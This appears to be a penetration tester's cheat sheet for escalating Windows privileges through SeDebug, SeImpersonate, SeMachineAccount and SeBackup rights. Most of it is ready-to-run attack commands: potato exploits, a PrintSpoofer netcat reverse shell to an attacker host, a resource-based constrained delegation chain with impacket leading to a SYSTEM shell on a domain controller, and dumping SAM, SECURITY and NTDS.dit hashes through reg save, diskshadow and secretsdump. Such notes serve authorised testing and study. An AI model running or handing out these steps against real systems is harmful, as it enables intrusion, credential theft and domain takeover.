Collection of Abuses possible of certain privileges.

## SeDebugPrivilege
Using this technique, we can elevate our privileges to SYSTEM by launching a child process and using the elevated rights granted to our account via SeDebugPrivilege to alter normal system behavior to inherit the token of a parent process and impersonate it.

First, transfer this PoC script to target https://github.com/decoder-it/psgetsystem

RCE as SYSTEM
```powershell
# identify running processes and accompanying PIDs
tasklist  # winlogon.exe is a good one as it runs as SYSTEM on windows hosts

# run script
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```

## SeManageVolumePrivilege
	[https://github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

## SeImpersonatePrivilege

Get .NET version for godpotato
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

PrintSpoofer exploit (also a potato)
	PrintSpoofer64.exe
	example
	.\PrintSpoofer64.exe -i -c powershell.exe
If printSpoofer does not work...
	see potato exploits
	Sweet potato
	Godpotato (convenient as precompiled exes)
	etc
	See Potatos page I made
```powershell
#Printspoofer
PrintSpoofer.exe -i -c powershell.exe 
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"

#GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"

#RoguePotato
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999

#JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a

#SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
#writes whoami command to w.log file
```

## SeMachineAccountPrivilege

This allows us to add computers to the domain. We can abuse the privs on these computers using the machine account.

Add computer
	`impacket-addcomputer <domain>.local/<user> -dc-ip <ip_address> -hashes :<NTLM_hash> -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'`
		-
		alternatively instead of hash, we can use `<domain>.local/<user>:<password>`
		-

Verify via evil-winrm session
	`get-adcomputer attack`

Modify Delegation rights
	download [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py)
		We need to set `msDS-AllowedToActOnBehalfOfOtherIdentity` on new machine account
	`sudo python3 rbcd.py <domain>\\<user> -dc-ip <ip_address> -t <DC_hostname> -f 'ATTACK' -hashes :<ntlm_hash> 
		-
		alternatively use `<domain>\\<username>:<password>`

Verify again via evil-winrm session
	`Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-`
	if this doesnt work that is still okay, it may still work

Get administrator service ticket with our privileged machine account
	`impacket-getST -spn cifs/<domain>dc.<domain>.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip <ip_address>`

 This saved the ticket on our Kali host as **Administrator.ccache**. We need to export a new environment variable named `KRB5CCNAME` with the location of this file.
	 `export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
		 this is located in the output of impacket-getST

Add a new entry in **/etc/hosts** to point `resourcedc.resourced.local` to the target IP address and run `impacket-psexec` to drop us into a system shell.
	`sudo sh -c 'echo "192.168.122.175 <domain>dc.<domain>.local" >> /etc/hosts'
	then
	`sudo impacket-psexec -k -no-pass <domain>dc.<domain>.local -dc-ip <ip_address>

## SeBackupPrivilege
https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960

#### Example 1 -- reg save
Use this for local accounts

`mkdir c:\temp`
```powershell
reg save hklm\sam c:\temp\sam
reg save hklm\system c:\temp\system
reg save hklm\security c:\temp\security
```

then transfer back

Dump creds with impacket secretsdump
`impacket-secretsdump -system system -sam sam local


#### Example 2 -- diskshadow
This may be used for domain accounts as well as local

Create script.txt
```bash
# script.txt contents
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Covert to Windows newlines
```bash
unix2dos script.txt
```

Run diskshadow
```
diskshadow /s script.txt
```

Copy NTDS.dit file using Robocopy to the temp file in C:
```powershell
C:\> robocopy /b E:\Windows\ntds . ntds.dit
```

copy system hive
```
reg save hklm\system c:\temp\system.bak
```

Secretsdump
	`impacket-secretsdump -system system -ntds ntds.dit local



## SeTakeOwnershipPrivilege

## SeRestorePrivilege
## SeLoadDriverPrivilege
## SeCreateTokenPrivilege